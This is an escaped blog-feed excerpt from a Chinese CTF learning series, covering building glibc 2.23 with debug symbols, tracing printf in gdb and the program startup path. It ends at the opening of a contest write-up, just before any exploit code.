包含库文件和头文件&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;p&gt;罢了……..还是报错….处理不了……..(回头试试16, 或者说 还是得换debian?  不纠结这个编译问题了…)&lt;/p&gt;
&lt;h3 id=&#34;转机&#34;&gt;&lt;a href=&#34;#转机&#34; class=&#34;headerlink&#34; title=&#34;转机&#34;&gt;&lt;/a&gt;转机&lt;/h3&gt;&lt;p&gt;&lt;a href=&#34;https://launchpad.net/ubuntu/xenial/amd64/libc6-dbg/2.23-0ubuntu11&#34;&gt;https://launchpad.net/ubuntu/xenial/amd64/libc6-dbg/2.23-0ubuntu11&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-46-glibc%E6%BA%90%E7%A0%81%E8%B0%83%E8%AF%95/image-20231106210245051.png&#34; alt=&#34;image-20231106210245051&#34;&gt;&lt;/p&gt;
&lt;p&gt;嘶,用了一下还是不太行&lt;/p&gt;
&lt;p&gt;不过实际做题也未必要一模一样的环境,反正给了libc,可以从里面找偏移&lt;/p&gt;
&lt;h3 id=&#34;报错处理&#34;&gt;&lt;a href=&#34;#报错处理&#34; class=&#34;headerlink&#34; title=&#34;报错处理&#34;&gt;&lt;/a&gt;报错处理&lt;/h3&gt;&lt;p&gt;之前报错说要加–disable-werror, 但是好像也没啥用,&lt;/p&gt;
&lt;p&gt;..&amp;#x2F;configure –disable-werror  –prefix&amp;#x3D;&amp;#x2F;usr&amp;#x2F;local&amp;#x2F;glibc-2.23  –enable-debug&amp;#x3D;yes&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;error: argument &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt; of type ‘&lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; __&lt;span class=&#34;title&#34;&gt;jmp_buf_tag&lt;/span&gt; *’ &lt;span class=&#34;title&#34;&gt;declared&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;as&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;a&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;pointer&lt;/span&gt; [-&lt;span class=&#34;title&#34;&gt;Werror&lt;/span&gt;=&lt;/span&gt;&lt;span class=&#34;built_in&#34;&gt;array&lt;/span&gt;-parameter=]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;number&#34;&gt;743&lt;/span&gt; | &lt;span class=&#34;keyword&#34;&gt;extern&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; __sigsetjmp (&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; __jmp_buf_tag *__env,&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;a href=&#34;https://stackoverflow.com/questions/76079071/when-i-compile-glibc-2-28-with-the-make-command-on-centos-7-5-i-got-the-error-l&#34;&gt;https://stackoverflow.com/questions/76079071/when-i-compile-glibc-2-28-with-the-make-command-on-centos-7-5-i-got-the-error-l&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;make[1]: *** [Makefile:214: stdio-common&amp;#x2F;subdir_lib] Error&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.cnblogs.com/zq10/p/14314952.html&#34;&gt;https://www.cnblogs.com/zq10/p/14314952.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://gist.github.com/stefan1wan/5e4b3973aae578ac39f94d30a5555f19&#34;&gt;https://gist.github.com/stefan1wan/5e4b3973aae578ac39f94d30a5555f19&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;make[2]: *** No rule to make target ‘..&amp;#x2F;manual&amp;#x2F;errno.texi’, needed by ‘..&amp;#x2F;sysdeps&amp;#x2F;gnu&amp;#x2F;errlist.c’.  Stop&lt;/p&gt;
&lt;p&gt;Inconsistency detected by ld.so: dl-call-libc-early-init.c: 37: _dl_call_libc_early_init: Assertion &amp;#96;sym !&amp;#x3D; NULL’ failed!&lt;/p&gt;
&lt;p&gt;问: 这里有现成的libc可以用,但是没有符号文件,    符号和源代码又是两回事吧&lt;/p&gt;
&lt;p&gt;答: 是的,两回事&lt;/p&gt;
&lt;p&gt;问: 没有符号咋办, 只能进行编译吗..&lt;/p&gt;
&lt;p&gt;答:  我记得之前做海大ctf,ida可以导入符号文件,网上有编译好的符号文件,这个网站上也有symbol, 但是不全&lt;/p&gt;
&lt;p&gt;问: gcc直接用这里的库编译会有问题,需要install?&lt;/p&gt;
&lt;p&gt;问: 如何编译符号文件呢&lt;/p&gt;
&lt;h1 id=&#34;调试案例&#34;&gt;&lt;a href=&#34;#调试案例&#34; class=&#34;headerlink&#34; title=&#34;调试案例&#34;&gt;&lt;/a&gt;调试案例&lt;/h1&gt;&lt;h2 id=&#34;printf的调用路径&#34;&gt;&lt;a href=&#34;#printf的调用路径&#34; class=&#34;headerlink&#34; title=&#34;printf的调用路径&#34;&gt;&lt;/a&gt;printf的调用路径&lt;/h2&gt;&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;hello,%s\n&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;world&amp;quot;&lt;/span&gt;); &lt;span class=&#34;comment&#34;&gt;//防止优化为puts&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;p&gt;​	调试, bt追踪栈&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;0  0x00007ffff7e5ca69 &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; __printf (format=0x55555555600a &lt;span class=&#34;string&#34;&gt;&amp;quot;hello,%s\n&amp;quot;&lt;/span&gt;) at printf.c:28&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;1  0x0000555555555169 &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; main ()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;2  0x00007ffff7e2d013 &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; __libc_start_main (main=0x555555555149 &amp;lt;main&amp;gt;, argc=1, argv=0x7fffffffe5a8, init=&amp;lt;optimized out&amp;gt;, fini=&amp;lt;optimized out&amp;gt;, rtld_fini=&amp;lt;optimized out&amp;gt;, stack_end=0x7fffffffe598) at ../csu/libc-start.c:308&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;3  0x000055555555508e &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; _start ()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;​	会发现进入的是__printf函数,为什么不是printf函数呢? 需要看libc源代码&lt;/p&gt;
&lt;p&gt;​	进到这里是因为ldbl_strong_alias (__printf, printf); 将printf和  _ _ printf进入了的函数统一为 _ _printf&lt;/p&gt;
&lt;p&gt;​	stdio-common&amp;#x2F;printf.c&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;libioP.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;stdarg.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;undef&lt;/span&gt; printf&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;/* Write formatted output to stdout from the format string FORMAT.  */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;/* VARARGS1 */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__printf (&lt;span class=&#34;type&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *format, ...)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  va_list arg;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; done;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  va_start (arg, format);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  done = &lt;span class=&#34;built_in&#34;&gt;vfprintf&lt;/span&gt; (&lt;span class=&#34;built_in&#34;&gt;stdout&lt;/span&gt;, format, arg);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  va_end (arg);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; done;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;undef&lt;/span&gt; _IO_printf&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ldbl_strong_alias (__printf, &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;/* This is for libg++.  */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ldbl_strong_alias (__printf, _IO_printf);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;p&gt;​	__printf又主要调用了vfprintf函数,在stdio-common&amp;#x2F;vfprintf.c中, 这个函数有点长&lt;/p&gt;
&lt;h2 id=&#34;函数完整加载过程&#34;&gt;&lt;a href=&#34;#函数完整加载过程&#34; class=&#34;headerlink&#34; title=&#34;函数完整加载过程&#34;&gt;&lt;/a&gt;函数完整加载过程&lt;/h2&gt;&lt;p&gt;恩….比较复杂..有时间专门学习下..&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-46-glibc%E6%BA%90%E7%A0%81%E8%B0%83%E8%AF%95/callgraph.png&#34; alt=&#34;image of the callgraph for all the routines involved in program startup on linux&#34;&gt;&lt;/p&gt;
&lt;p&gt;原文地址: &lt;a href=&#34;http://dbp-consulting.com/tutorials/debugging/linuxProgramStartup.html&#34;&gt;http://dbp-consulting.com/tutorials/debugging/linuxProgramStartup.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;翻译: &lt;a href=&#34;https://zhuanlan.zhihu.com/p/52054044&#34;&gt;https://zhuanlan.zhihu.com/p/52054044&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://zhuanlan.zhihu.com/p/521205296&#34;&gt;https://zhuanlan.zhihu.com/p/521205296&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;其他参考: &lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://xuanxuanblingbling.github.io/ctf/pwn/2021/12/12/csu/&#34;&gt;https://xuanxuanblingbling.github.io/ctf/pwn/2021/12/12/csu/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;程序员的自我修养里面也有&lt;/p&gt;
&lt;h3 id=&#34;start&#34;&gt;&lt;a href=&#34;#start&#34; class=&#34;headerlink&#34; title=&#34;_start&#34;&gt;&lt;/a&gt;_start&lt;/h3&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;0000000000001060 &amp;lt;_start&amp;gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    1060:	f3 0f 1e fa          	endbr64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    1064:	31 ed                	xor    %ebp,%ebp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    1066:	49 89 d1             	mov    %rdx,%r9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    1069:	5e                   	pop    %rsi&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    106a:	48 89 e2             	mov    %rsp,%rdx&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    106d:	48 83 e4 f0          	and    $0xfffffffffffffff0,%rsp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    1071:	50                   	push   %rax&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    1072:	54                   	push   %rsp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    1073:	4c 8d 05 66 01 00 00 	lea    0x166(%rip),%r8        # 11e0 &amp;lt;__libc_csu_fini&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    107a:	48 8d 0d ef 00 00 00 	lea    0xef(%rip),%rcx        # 1170 &amp;lt;__libc_csu_init&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    1081:	48 8d 3d c1 00 00 00 	lea    0xc1(%rip),%rdi        # 1149 &amp;lt;main&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    1088:	ff 15 52 2f 00 00    	callq  *0x2f52(%rip)        # 3fe0 &amp;lt;__libc_start_main@GLIBC_2.2.5&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    108e:	f4                   	hlt&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    108f:	90                   	nop&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;







&lt;h3 id=&#34;libc-start-main&#34;&gt;&lt;a href=&#34;#libc-start-main&#34; class=&#34;headerlink&#34; title=&#34;__libc_start_main&#34;&gt;&lt;/a&gt;__libc_start_main&lt;/h3&gt;&lt;p&gt;starti可以从最开始启动时下断点&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-46-glibc%E6%BA%90%E7%A0%81%E8%B0%83%E8%AF%95/image-20231105211445286.png&#34; alt=&#34;image-20231105211445286&#34;&gt;&lt;/p&gt;
&lt;p&gt;可以慢慢地去一探究竟程序的过程了！&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://refspecs.linuxbase.org/LSB_3.1.1/LSB-Core-generic/LSB-Core-generic/baselib---libc-start-main-.html&#34;&gt;https://refspecs.linuxbase.org/LSB_3.1.1/LSB-Core-generic/LSB-Core-generic/baselib---libc-start-main-.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;​	它会处理执行环境的初始化工作, 然后调用main函数, 并且处理main函数的返回,&lt;/p&gt;
&lt;p&gt;​	它可能干的事如下&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;performing any necessary security checks if the effective user ID is not the same as the real user ID.&lt;/li&gt;
&lt;li&gt;initialize the threading subsystem.&lt;/li&gt;
&lt;li&gt;registering the &lt;code&gt;*rtld_fini*&lt;/code&gt; to release resources when this dynamic shared object exits (or is unloaded).&lt;/li&gt;
&lt;li&gt;registering the &lt;code&gt;*fini*&lt;/code&gt; handler to run at program exit.&lt;/li&gt;
&lt;li&gt;calling the initializer function &lt;code&gt;(**init*)()&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;calling &lt;code&gt;main()&lt;/code&gt; with appropriate arguments.&lt;/li&gt;
&lt;li&gt;calling &lt;code&gt;exit()&lt;/code&gt; with the return value from &lt;code&gt;main()&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;参考&#34;&gt;&lt;a href=&#34;#参考&#34; class=&#34;headerlink&#34; title=&#34;参考&#34;&gt;&lt;/a&gt;参考&lt;/h1&gt;&lt;p&gt;&lt;a href=&#34;https://xuanxuanblingbling.github.io/ctf/tools/2020/03/20/gdb/&#34;&gt;https://xuanxuanblingbling.github.io/ctf/tools/2020/03/20/gdb/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;[原创]关于不同版本 glibc 更换的一些问题: &lt;a href=&#34;https://bbs.kanxue.com/thread-254868.htm&#34;&gt;https://bbs.kanxue.com/thread-254868.htm&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://gist.github.com/stefan1wan/5e4b3973aae578ac39f94d30a5555f19&#34;&gt;https://gist.github.com/stefan1wan/5e4b3973aae578ac39f94d30a5555f19&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&#34;问答&#34;&gt;&lt;a href=&#34;#问答&#34; class=&#34;headerlink&#34; title=&#34;问答&#34;&gt;&lt;/a&gt;问答&lt;/h1&gt;&lt;p&gt;有无符号的区别在哪呢….蒙圈了&lt;/p&gt;
&lt;p&gt;函数、变量符号&lt;/p&gt;
&lt;p&gt;有符号的话是可以看到定义的那些变量、函数等,但是不知道行数、具体的代码&lt;/p&gt;
&lt;p&gt;符号文件在哪?&lt;/p&gt;
&lt;p&gt;deb如何解包 dpkx -x   xxxxx.deb .&amp;#x2F;&lt;/p&gt;
&lt;p&gt;debug文件为什么会有单独的,为什么glibcallinone里的不用呢&lt;/p&gt;
</content>
        <category term="PWN入门" />
        <updated>2023-11-06T13:01:36.000Z</updated>
    </entry>
    <entry>
        <id>https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-45-10%E6%9C%88%E6%9C%88%E8%B5%9B%E4%B8%A4%E9%A2%98/</id>
        <title>pwn入门-45-10月月赛两题</title>
        <link rel="alternate" href="https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-45-10%E6%9C%88%E6%9C%88%E8%B5%9B%E4%B8%A4%E9%A2%98/"/>
        <content type="html">&lt;p&gt;题目文件: 本链接+.&amp;#x2F;sorted  .&amp;#x2F;ezpwn&lt;/p&gt;
&lt;p&gt;总结下来就是基础太不牢固了，很多小点都不清楚，浪费时间，每次遇到后都要尽量及时解决，查缺补漏。&lt;/p&gt;
&lt;h1 id=&#34;sorted&#34;&gt;&lt;a href=&#34;#sorted&#34; class=&#34;headerlink&#34; title=&#34;sorted&#34;&gt;&lt;/a&gt;sorted&lt;/h1&gt;&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; __cdecl &lt;span class=&#34;title function_&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; argc, &lt;span class=&#34;type&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; **argv, &lt;span class=&#34;type&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; **envp)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; i; &lt;span class=&#34;comment&#34;&gt;// [rsp+0h] 